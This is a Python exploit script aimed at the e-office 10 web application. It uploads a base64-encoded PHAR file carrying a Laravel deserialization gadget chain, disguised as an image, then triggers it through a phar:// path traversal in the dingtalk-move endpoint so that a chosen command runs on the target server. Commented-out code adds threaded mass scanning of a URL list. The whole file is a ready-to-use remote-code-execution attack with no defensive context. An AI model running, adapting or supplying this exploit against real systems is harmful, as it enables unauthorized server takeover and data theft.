# -*- coding:utf-8 -*-
import json
import requests
import urllib3
import hashlib
import time
from hashlib import sha1
import base64
 
 
def payload(url):
    cmd="whoami"
    urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
    hearder = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    file = base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQokAQAAAQAAABEAAAABAAAAAADuAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQgAAAB0ZXN0LnR4dAUAAAAqH6ZhBQAAAOmPsbu0AQAAAAAAAHRlc2F05eRmN0jjnqjxPuyQ7MEQ33p3j+QCAAAAR0JNQg==")
    # print(file)
    data = file[:-28]
    # print(b's:'+bytes(str(len(cmd)),encoding="utf-8")+b':"'+bytes(cmd, encoding='utf-8')+b'"')
    data = data.replace(b's:6:"whoami"', b's:'+bytes(str(len(cmd)),encoding="utf-8")+b':"'+bytes(cmd, encoding='utf-8')+b'"')
    final = file[-8:]
    newfile = data + sha1(data).digest() + final
    upload_file = {"Filedata": ("register.inc", newfile, "image/jpeg")}
    urllib3.disable_warnings()
    response = requests.post(url=urls, files=upload_file, headers=hearder)  # ,proxies=proxy)
    response_text = response.text
    print("响应：",response.text)
    attachment_id = json.loads(response_text)['data']['attachment_id']
 
    urls = url + '/eoffice10/server/public/api/wps/v1/3rd/file/history'
    heards = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
        'x-weboffice-file-id': attachment_id
    }
    urllib3.disable_warnings()
    response = requests.post(url=urls, headers=heards, verify=False)  # ,proxies=proxy)
    response_json = response.json()
    filename = str(response_json["histories"][0]["create_time"]) + 'register.inc'
    md5name = hashlib.md5(filename.encode())
    md5name = md5name.hexdigest()
    Time = time.strftime('%Y/%m/%d', time.localtime(time.time()))
 
    urls = url + '/eoffice10/server/public/api/dingtalk/dingtalk-move?imgs=phar://../../../../attachment/' + Time + '/' + attachment_id + '/' + md5name + '.inc'
    hearder = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    urllib3.disable_warnings()
    print(urls)
    response = requests.post(url=urls, verify=False, headers=hearder)  # ,proxies=proxy)
    response_text = response.text
    print(response_text)
    result = response_text.split('}')[-1]
    print(result)
 
 
if __name__ == '__main__':
    # url = input("url: ")
    # cmd = input("要执行的命令: ")
    # if not url.startswith(("http://", "https://")):
    #     url = "http://" + url
    # if url.endswith("/"):
    #     url = url[:-1]
    # with open('urls.txt', 'r') as file:
    #     urls = [u.strip() for u in file.readlines()]

    # for u in urls:
    #     try:
    payload(input("url:"))
    #     except:
    #         print("error")
    # 批量检测
    # from concurrent.futures import ThreadPoolExecutor
    # with open('urls.txt', 'r') as file:
    #     urls = [u.strip() for u in file.readlines()][200:]
    # with ThreadPoolExecutor(max_workers=20) as executor:
    #     executor.map(payload, urls)
    